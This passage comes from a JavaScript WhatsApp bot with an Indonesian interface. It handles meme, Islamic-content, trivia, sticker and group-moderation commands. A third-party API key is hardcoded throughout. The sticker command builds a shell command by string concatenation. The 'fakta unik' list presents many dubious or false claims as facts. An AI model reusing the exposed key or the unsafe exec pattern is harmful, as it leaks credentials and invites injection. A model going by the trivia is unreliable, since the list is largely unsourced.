reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
get_result = await getBuffer(`https://api.lolhuman.xyz/api/meme/memeindo?apikey=d16af494a6d7bd0fc1cf55a1`,  {method: 'get'}) 
await xdev.sendMessage(from, get_result, image, { quoted: dev, caption: "*Done Kak!!*" })
break

case 'darkjoke':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
get_result = await getBuffer(`https://api.lolhuman.xyz/api/meme/darkjoke?apikey=d16af494a6d7bd0fc1cf55a1`,  {method: 'get'}) 
await xdev.sendMessage(from, get_result, image, { quoted: dev, caption: "*Done Kak!!*" })
break
        
 case 'quotesislami':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
anu = await fetchJson(`https://api.lolhuman.xyz/api/quotes/islami?apikey=d16af494a6d7bd0fc1cf55a1`, {method: 'get'}) 
reply(`*──❒ Quotes Islami ❒──*\n\n${anu.result}`)
break

case 'pantun':
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
anu = await fetchJson(`https://api.lolhuman.xyz/api/random/pantun?apikey=d16af494a6d7bd0fc1cf55a1`, {method: 'get'}) 
reply(`*──❒ PANTUN ❒──*\n\n${anu.result}`)
break                                      

case 'hadis': case 'hadist': {
setReply(mess.wait)
if (args.length < 1) return reply(`*Hadist Yang Ke Berapa ?*
*Contoh : ${prefix}bukhari 1 ${prefix}abu-daud 1*

*⦁ Pilihan Tersedia :*

⦁ abu-daud 1 - 4590
⦁ ahmad 1 - 26363
⦁ bukhari 1 - 7008
⦁ darimi 1 - 3367
⦁ ibu-majah 1 - 4331
⦁ nasai 1 - 5662
⦁ malik 1 - 1594
⦁ muslim 1 - 5362

*⦁ Semoga Bermanfaat .*
`)
if (args.length < 1) return reply(`*Hadis Yang Ke Berapa ?*\n*Contoh : ${prefix}muslim 1*`)
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
m.reply(`*──❒ HADIST ❒──*

*⦁ No.* ${number}

*⦁ Bahasa Arab :* ${arab}

*⦁ Bahasa Indonesia :* ${id}

*⦁ Semoga Bermanfaat .*
`)
} catch (e) {
m.reply(`*Hadis Tidak Ditemukan!!*`)
}
}
break

case 'alquran': {
setReply(mess.wait)
if (args.length < 1) return reply(`*Contoh Penggunaan : ${prefix}alquran 1 2*\n\n*Maka Hasilnya Adalah Surah Al-Fatihah Ayat 2 Dan Ayatnya 1 Aja*`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*──❒ ALQURAN ❒──*

*⦁ Bahasa Arab :* ${res.result.data.text.arab}

*⦁ Bahasa Indonesia :* ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )

*⦁ Semoga Bermanfaat .*
`
m.reply(txt)
}
break

case 'kisahnabi':
setReply(mess.wait)
if (args.length == 0) return reply(`*Namanya Nabi?*`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=d16af494a6d7bd0fc1cf55a1`)
get_result = get_result.result
ini_txt = `*──❒ KISAH NABI ❒──*\n\n`
ini_txt = `*⦁ NABI ${get_result.name}*\n`
ini_txt += `*⦁ Lahir :* ${get_result.thn_kelahiran}\n`
ini_txt += `*⦁ Umur :* ${get_result.age}\n`
ini_txt += `*⦁ Tempat :* ${get_result.place}\n`
ini_txt += `*⦁ Kisah :* \n${get_result.story}`
reply(ini_txt)
break

case 'jadwalsholat':
setReply(mess.wait)
if (args.length == 0) return reply(`*Nama Wilayahnya?*`)
daerah = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=d16af494a6d7bd0fc1cf55a1`)
get_result = get_result.result
ini_txt = `*──❒ JADWAL SHOLAT ❒──*\n\n`
ini_txt = `*⦁ Wilayah ${get_result.wilayah}*\n\n`
ini_txt += `*⦁ Subuh :* ${get_result.subuh}\n`
ini_txt += `*⦁ Terbit  :* ${get_result.terbit}\n`
ini_txt += `*⦁ Dhuha :* ${get_result.dhuha}\n`
ini_txt += `*⦁ Dzuhur :*  ${get_result.dzuhur}\n`
ini_txt += `*⦁ Ashar  :* ${get_result.ashar}\n`
ini_txt += `*⦁ Maghrib :* ${get_result.maghrib}\n`
ini_txt += `*⦁ Isya     :* ${get_result.isya}\n\n`
ini_txt += `*──❒ WAKTU PAGI ❒──*\n\n`
ini_txt += `*⦁ Sahur :* ${get_result.sahur}\n`
ini_txt += `*⦁ Imsak :* ${get_result.imsak}\n`
ini_txt += `*⦁ Tanggal :* ${get_result.tanggal}\n`
reply(ini_txt)
break

case 'asmaulhusna':
setReply(mess.wait)
if (args.length == 0) return reply(`*Kirim Perintah {prefix}asmaulhusna Nomornya*`)
get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=d16af494a6d7bd0fc1cf55a1`)
get_result = get_result.result
ini_txt = `*──❒ ASMAUL HUSNA ❒──*\n\n`
ini_txt += `*⦁ NOMOR ${get_result.index}*\n`
ini_txt += `*⦁ Arab :* ${get_result.ar}\n`
ini_txt += `*⦁ Latin :* ${get_result.latin}\n`
ini_txt += `*⦁ Indonesia :* ${get_result.id}\n`
reply(ini_txt)
break		


            
            
case 'faktaunik':{
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
const faktau = ["Negara Indonesia berada di posisi ke-4 sebagai Negara Terindah di Dunia versi situs First Choice.","Di Italia, dalam aturannya minuman Cappuccino hanya boleh di minum sebelum waktu siang.","AS, Australia, Finlandia, Jerman dan Kanada adl negara maju tanpa UN. Tahukah anda sekolah trbaik di dunia ada di Finlandia walau tanpa UN.","","\"Jengkol is very nice\" komentar Pierre Bouvier vokalis Simple Plan.","Tiap satu kali jari kita mengklik mouse komputer, ada 1,42 kalori yang terbakar dalam tubuh. (Penelitian, Convert Anything to Calories).","Di Jepang kuno, prajurit diolesi minyak kodok pada tubuh mereka dengan keyakinan bahwa hal itu akan membuat tubuh mereka antirobek."," Di Jepang, ketiduran saat bekerja (inemuri) dapat ditolerir, karena dipandang sebagai kelelahan yang muncul akibat bekerja terlalu keras.","Gergaji mekanik awalnya diciptakan sebagai alat kedokteran untuk membantu melahirkan bayi.","Jangan sering mengatakan kata  di Australia dan Selandia Baru. Di sana, kata berarti mengajak untuk melakukan hubungan seks.","Jamur merang Laetiporus dikenal sebagai julukan \"ayam hutan\" karena konon rasanya mirip seperti daging ayam goreng.","Kaki katak merupakan hidangan istimewa di eropa. Tahukah Anda: sekitar 80% impor katak Eropa berasal dari Indonesia.","Jika Anda mengetik \"do the harlem shake\" di search bar YouTube, layar akan melakukan Harlem Shake!. [Google Chrome]","Melihat melalui lubang kecil akan segera meningkatkan penglihatan Anda sementara.","YouTube menyebutkan rata-rata ada 4000 video baru Harlem Shake yang diunggah setiap hari. [Yahoo!]","Semut memiliki kuburan sendiri. Tapi tahukah anda: Gurita memiliki kebun dan suka berkebun. (wikipedia)","Coklat mengandung Theobromine, molekul organik yang dapat membantu menguatkan enamel gigi. (Penelitian dari Tulane University).","Wanita 2 kali lebih banyak menggunakan emoticon dalam pesan teks dibandingkan pria. (Penelitian di Rice University)","Biarpun Buzz Aldrin adalah orang kedua yang menginjak di bulan tetapi ia adalah orang pertama yang membuang kotoran di ruang angkasa.","Fakta unik berikutnya adalah, Psikolog mengatakan bahwa mengirim dan menerima pesan teks benar-benar dapat meningkatkan mood Anda ketika Anda merasa kesepian. (Telegraph)","Thailand merupakan satu-satunya negara di Asia Tenggara yang tidak pernah dijajah.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. (cracked .com)"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. (BBCnews)","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Semakin pahit cokelat (tinggi zat theobromine), semakin tinggi manfaatnya. Rajin mengkonsumsi 1bar cokelat/hari dapat menyembuhkan batuk kronis.","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".","Tidur Siang (Power Nap) trbukti menambah tinggi badan, dikrnkan saat kita tidur siang hormon pertumbuhan (Growth Hormone) lbh aktif bekerja.","Bilangan prima terbesar di dunia saat ini panjangnya 17 juta digit angka, cukup banyak untuk mengisi 28 lembar halaman pada buku novel.","Menurut sebuah studi, minum teh hijau setelah makan ikan membantu menghalangi zat Mercury yang terkandung dalam ikan memasuki aliran darah."," Memperpanjang usia handphone hingga 4 tahun dapat mengurangi dampak lingkungan sampai 40 persen. [Hasil studi di Swiss]","Duduk bersama dgn teman-teman / keluarga utk makan bersama, dpt meningkatkan kebahagiaan & membantu meringankan depresi. [ehealthnewsdaily]","Abibliophobia adalah fobia atau ketakutan terhadap kehabisan bahan bacaan.","Pada abad pertengahan di Eropa, garam sangat mahal harganya, sehingga disebut sebagai \"emas putih\".","Mengunyah permen karet dapat meningkatkan kemampuan berpikir cepat dan kewaspadaan hingga 10 persen. [Jurnal Brain and Cognition]","Wanita yang sedang stres selama kehamilannya cenderung melahirkan anak-anak yang pemarah. [Institute of Psychiatry, King College London]","","35. Disarankan supaya membeli sepatu pada sore hari. Sebab, setelah seharian berjalan, di sore hari kaki akan membesar 5-8 persen.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. [cracked .com]","Menurut penelitian baru, usia harapan hidup anak band rata-rata lebih tinggi dibandingkan musisi yang memilih solo karir. (detikHealth)","Pulau Dewata Bali merupakan 1 dari 10 pulau paling romantis di dunia. [majalah Travel+Leisure]","Universitas di Jepang selalu melakukan upacara peringatan bagi hewan (contoh: tikus) yang mati dalam pengujian laboratorium. [web.archive .org]","Berkedip memberikan otak Anda istirahat sebentar. [para ilmuan di Japan’s Osaka University]","Wanita yang bahagia dalam sebuah pernikahan akan mengalami berat badan naik setengah pound (0,22 kg) setiap 6 bulan. [DailyMail]","Rasa cemburu berlebihan bisa digolongkan penyakit jiwa, krna dpt mendorong ssorg utk bunuh diri / menghabisi nyawa org lain. [riset]","","Mengkonsumsi buah tomat beberapa kali dlm kurun waktu seminggu dpt mengatasi perasaan depresi. [peneliti di Tianjin Medical Univ., Cina]"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. [BBCnews]","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Memeluk orang yg disayangi dpt membantu menurunkan tekanan darah, mengurangi stres dan","kecemasan, bahkn dpt meningkatkan memori. [Dailymail]","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".Berjalan kaki atau bersepeda ke sekolah mempertajam konsentrasi siswa di kelas dan tetap bertahan sekitar 4 jam kemudian. [Medical Daily]","Menurut riset pasar global Euromonitor International, pria Korea adalah pria yang paling suka bersolek dari pria lain di dunia.","Rata-rata orang akan merasa 100 persen sehat / fit hanya 61 hari dalam setahun. (Penelitian di Inggris)","Polydactyl Cat adalah jenis kucing yang memiliki jempol di kaki mereka.","Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]","Di Jerman, tahanan yg ingin meloloskan diri dr penjara adl bukan mrupakn perbuatan ilegal. Krn itu salah1 naluri dasar manusia untuk kebebasan.","Wanita merasa diri mereka terlihat paling jelek dan terlihat lebih tua pada hari Rabu pukul 15.30 . [studi baru dari St Tropez]Orang yang rutin bermain video game ternyata memiliki penalaran yang baik dibanding kebanyakan orang. (detikHealth)","Nama \"Gorila\" berasal dari kata Yunani \"Gorillai\" yang berarti \"perempuan berbulu\".","IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.","Selama abad ke-13, kata \"nice\" sebenarnya berarti “stupid”, \"senseless\" dan “foolish\".","59. 49% dari pemilik Smartphone adalah jomblo. (Survei, \"2012 Online User Behavior and Engagement Study\")","Fakta Unik","60. Gazzarella adalah keju mozzarella yang terbuat dari susu kucing. 61. Rata-rata orang melihat / mengecek ponselnya sekitar 150 kali sehari. (Laporan Nokia pada MindTrek 2010)","Lalat dapat menyalurkan sekitar 300 bakteri setiap kali hinggap di benda.","Tertawa dapat meningkatkan aktivitas antibodi sekitar 20%, juga membantu untuk menghancurkan virus dan sel-sel tumor.","Fobia matematika (mathematics anxiety) memicu respon yang sama di otak sbg rasa sakit fisik. Gejalanya yaitu melihat angka saja sudah nyeri."," Karakter kartun Bugs Bunny diberi pangkat kehormatan sersan-mayor di Korps Marinir AS pada akhir Perang Dunia II. (wikipedia)","Apel yang ditaruh di ruang terbuka akan matang 10 kali lebih cepat dibandingkan dengan apel yang ditaruh di kulkas.","Ungkapan 'Smitten' adalah untuk menyebut 'naksir' dalam bahasa Inggris.","Menurut etiket internasional, sebuah jabat tangan yang tepat dan baik harus berlangsung selama sekitar 3 detik & dilepaskan setelah goyang.","Ketika kita sedang jatuh cinta, otak akan memproduksi dopamin ekstra, bahan kimia yang membuat seseorang menjadi gembira berlebihan."," \"Mwahahaha\" dan \"lolz\" telah ditambahkan ke Kamus Inggris Oxford.","Menurut penelitian, pria cenderung menurunkan volume suaranya ketika ia berbicara dg seseorang yg ia cintai, sementara perempuan sebaliknya.","Di Perancis, jajanan Arum Manis (Rambut Nenek) disebut \"Barbe á Papa\" yang berarti \"Jenggot Ayah\".","Menurut penelitian, PR terlalu banyak sebenarnya dapat menyebabkan siswa menjadi stres, depresi & mendapat nilai lebih rendah.","Hangry adalah penggabungan kata dari \"Hungry\" dan \"Angry\", di pakai ketika anda sedang lapar dan marah.","Kentut dari bakteri membuat keju swiss memiliki lubang-lubang.","Mendengarkan musik benar-benar dapat mengurangi rasa sakit kronis hingga 20% dan membantu meringankan depresi hingga 25%. (sciencedaily)","Orang yang merasa kesepian memiliki kemungkinan mengalami kepikunan 70-80% lebih tinggi. (Journal of Neurosurgery Neurologi and Psychiatry)","Melamun dpt memendekkan telomere (bagian paling ujung sel DNA) yang berperan dlm menjaga kestabilan sel, dimana dapat mempercepat proses penuaan."]
const ran_faktau = faktau[Math.floor(Math.random() * faktau.length)]
reply(`⸢ *Fakta Unik* ⸥\n${ran_faktau}`)
}
break            
		
		
		
		
		
            

           
            
            
                                                                                
                                                                                                        
                                                                                                                    
            
            
            
            
            
            



case 'triggered':
					if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
					if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
					owgi = await xdev.downloadMediaMessage(ger)
				    anu = await upload(owgi)
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu4 = `https://some-random-api.ml/canvas/${command}?avatar=${anu}`
					exec(`wget ${anu4} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					 if (err) return setReply(err)
					xdev.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: dev})
					fs.unlinkSync(rano)
					
					})
					} else {
					setReply('Gunakan foto!')
					}
					break 
    
    
    
	
    
    
	
	
	
	
	
	
	
            

	
		
			
	case 'hidetag':
            if (!isGroupAdmins) return sendSticker(hanyaadmin)
            if (!isGroupAdmins && !isOwner && !dev.key.fromMe) return reply(mess.only.admin)	
			var value = args.join(' ')
			var group = await xdev.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			xdev.sendMessage(from, optionshidetag, text)
			break
	
	case 'asupan':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
	if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
           const rows5 = [{
        "title": 'rikagusriani',
        "rowId": '0'
    }, {
        "title": 'ukhty',
        "rowId": '0'
    }, {
        "title": 'santuy',
        "rowId": '0'
    }, {
        "title": 'geayubi',
        "rowId": '0'
    }, {
        "title": 'bocil',
        "rowId": '0'
    }, {
        "title": 'asupan',
        "rowId": '0'
    }, {
        "title": 'chika',
        "rowId": '0'
    }, {
        "title": 'delvira',
        "rowId": '0'
    }, {
        "title": 'ayu',
        "rowId": '0'
    }, {
        "title": 'bunga',
        "rowId": '0'
    }, {
        "title": 'aura',
        "rowId": '0'
    }, {
        "title": 'nisa',
        "rowId": '0'
    }, {
        "title": 'ziva',
        "rowId": '0'
    }, {
        "title": 'yana',
        "rowId": '0'
    }, {
        "title": 'viona',
        "rowId": '0'
    }, {
        "title": 'syania',
        "rowId": '0'
    }, {
        "title": 'riri',
        "rowId": '0'
    }, {
        "title": 'syifa',
        "rowId": '0'
    }, {
        "title": 'mama_gina',
        "rowId": '0'
    }, {
        "title": 'alcakenya',
        "rowId": '0'
    }, {
        "title": 'mangayutri',
        "rowId": '0'
    }];
    const sections5 = [{
        title: 'Pilih salah satu',
        rows: rows5
    }];
    const listt5 = {
        buttonText: 'SELECT HERE',
        title: `ASUPAN MENU`,
        description: `Hai kak ${pushname} Semoga harimu menyenangkan 😇`,
        footerText: `Botz its Upgraded`,
        sections: sections5,
        listType: 1
    };
    xdev.sendMessage(from, listt5, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break

           
	
	
	
	
	
	
           
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
  //-------------------------------》FITUR GROUP《-------------------------------\\       
    
    
    
    
       case 'simi':              
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (!isGroup) return setReply('hanya bisa di group')
						if (isSimi) return setReply('Fitur sudah aktif kak')
						siminya.push(from);
						//fs.writeFileSync("./database/simi.json", JSON.stringify(siminya))
						let ih =`Fitur simi telah di aktifkan di group ini, ketik silakan ketik ${prefix}halo`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isGroup) return setReply('hanya bisa di group')
						if (!isSimi) return setReply('Udah mati')
						siminya.splice(from, 1);
						//fs.writeFileSync("./database/simi.json", JSON.stringify(siminya))
						let ih =`Fitur simi telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE SIMI SIMI`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}simi on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}simi off`, buttonText: { displayText: Off },type: 1}]);
                    } else {  
       if(isSimi) return   
	   simi = await fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
       sami = simi.success
       setReply(sami) 
       }
       break
             
             
    
    
    
    
case 'linkgc':
case 'linkgroup':
if (!isGroup) return
try {
var pic = await xdev.getProfilePicture(from)
} catch {
var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
linkgc = await xdev.groupInviteCode(from)
yeh = `*──❒ LINK GROUP ❒──*

*Nih linknya :*
https://chat.whatsapp.com/${linkgc}

⦁ Tutorial ramein group whatsapp
⦁ No click 🔎 ẉa.me/aryagans
⦁ Shere media sosial
⦁ Facebook
⦁ Twitter
⦁ Telegram
⦁ Story Whatsapp
⦁ Share Digroup Lain

*⦁ Awokawokawok 😎 .*
`
xdev.sendMessage(from, yeh, text, {
'contextInfo': {  
'text': '🔥',
'forwardingScore': 10000000,
'isForwarded': true,
'sendEphemeral': true,
'externalAdReply': {
'title':`${groupName}`,
'body': '',
'previewType': 'PHOTO',
'thumbnail': await getBuffer(pic),
'sourceUrl':`http://wa.me/${nomerOwner}`
}
}
})
break

case 'gc':
case 'group':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
 if (!q) {
               sendButMessage(from, `GRUP SETTING`, `Silahkan pilih salah satu`, [
                 {buttonId: `${prefix}group open`, buttonText: {displayText: `OPEN`,},type: 1},
                 {buttonId: `${prefix}group close`, buttonText: {displayText: `CLOSE`,},type: 1}]);
                    }
if (args[0] === 'open') {

await  xdev.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'close') {
 await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
                 break;



	



					
					
					
					
					
					case 'antivo':
					if (!isGroupAdmins) return sendSticker(hanyaadmin)
					     if(isExtream) return
					if (!isGroup) return setReply('hanya bisa di group')
					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
          if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
          
          if (isAntiviewonce) return setReply("Sudah aktif!!");
          addDataId(from, command, DataId)
          setReply("Sukses mengaktifkan antiviewonce!");
        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
           
          if (!isAntiviewonce) return setReply("Sudah mati!!");       
          removeDataId (command, from, DataId)
          setReply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTI VIEW ONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antivo on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antivo off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
					
					
					
					
    

					
					
					
					
					
case 'out':
case 'leave':
case 'kickme':
try{
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
await xdev.groupRemove(from, [sender])
await setReply("*Done Awokawok!!*")
} catch (err){
setReply(`${err}`)
}
break
					


    
case 'kick':
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer`)       
if (args[0] == '08') return setReply('Awali nomor dengan 62')  
if (args[0] == botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke === ownerNumber[0]) return setReply("Ga mau")
await setReply(`*──❒ TELAH MENGELUARKAN SI ONAR ❒──*\n\n*Jangan Bikin Onar Dong Kak Tuh Kena Kick 🤣*\n`);
await xdev.groupRemove(from, [woke])
    
} else if (mentionByReply) {
if (!isGroup) return setReply("Hanya bisa di group")
Nomer =`${mentionByReply.split("@")[0]}@s.whatsapp.net`
if(Nomer === ownerNumber[0]) return setReply("Ga mau")
if(Nomer === botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
await setReply( `*──❒ TELAH MENGELUARKAN SI ONAR ❒──*\n\n*Nih Nomornya @${mentionByReply.split("@")[0]}*\n*Jangan Bikin Onar Dong Kak Tuh Kena Kick 🤣*\n`);
await xdev.groupRemove(from, [mentionByReply])
    
 } else if(mentionByTag.length == 1) { 
if (mentionByTag.length > 1) return setReply(`Satu satu dong`)
if (mentionByTag.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
if(mentionByTag[0].split("@")[0] + '@s.whatsapp.net' === botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
if (mentionByTag.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
await setReply(`*──❒ TELAH MENGELUARKAN SI ONAR ❒──*\n\n*Jangan Bikin Onar Dong Kak Tuh Kena Kick 🤣*\n`);
await xdev.groupRemove(from, [mentionByTag[0]])
} else{
setReply(`Kirim perintah *${prefix}kick* @ tag atau nomor atau reply pesan orang yang ingin di kick`)
}
break    


case 'add':
try{
if (!isGroup) return setReply(mess.only.group)
if (!isGroupAdmins) return sendSticker(hanyaadmin)
if (!isBotGroupAdmins) return sendSticker(jadiinadmin)     
if ( dev.message.extendedTextMessage === null) {
if(!q) return setReply("*Reply Atau Input Nomer Target!!*")
if (args[0] == '08') return setReply('*Awali Nomor Dengan 62!!*')
woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
response = await xdev.groupAdd(from, [woke])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return setReply('*Target Sudah Di Didalam Group!!*')
if(inv[0].code == 403) return setReply('*Eror, Karena Di Private!!*')
if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
} else if (mentionByReply) {
if (!isGroup) return setReply("*Hanya Bisa Di Group!!*")
response = await xdev.groupAdd(from, [mentionByReply])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return setReply('*Target Sudah Di Didalam Group!!*')
if(inv[0].code == 403) return setReply('*Gagal, Karena Di Private!!*')
if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
} else{
setReply("*Reply Atau Input Nomer Target!!*")
}
} catch (err){
console.log(err)
setReply("*❌ Terjadi ERROR, Mungkin Nomornya Salah Kak!!*")
}
break










    
    case 'setwelcome':
    if ((args[0]) === 'type1' ) {
    if(xdev.welcome === "type1") return setReply("Udah aktif")
    xdev.welcome = "type1"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if ((args[0]) === 'type2' ) {
    if(xdev.welcome === "type2") return setReply("Udah aktif")
    xdev.welcome = "type2"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if ((args[0]) === 'type3' ) {
   if(xdev.welcome === "type3") return setReply("Udah aktif")
    xdev.welcome = "type3"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if ((args[0]) === 'type4' ) {
   if(xdev.welcome === "type4") return setReply("Udah aktif")
    xdev.welcome = "type4"
    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
    } else if(!q){
    setReply("Pilih setwelcome : type1 atau type2 atau type3")
    } else {
    setReply("Query tidak di temukan")
    }
    break
    
    
   
    
    



                 
      case 'antilinkgc':
      if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (!isGroup) return setReply('hanya bisa di group')
					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
						addDataId(from, command, DataId)
						let ih =`Fitur antilink group telah di aktifkan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntilinkGc) return setReply('Udah mati')
						removeDataId (command, from, DataId)
						let ih =`Fitur antilink group telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
    
    
    
               
       
         



										
					case "antivirtex":
	    if(isExtream) return
		if (!isGroupAdmins) return sendSticker(hanyaadmin)
        if (!isGroup) return setReply('Kusus group')
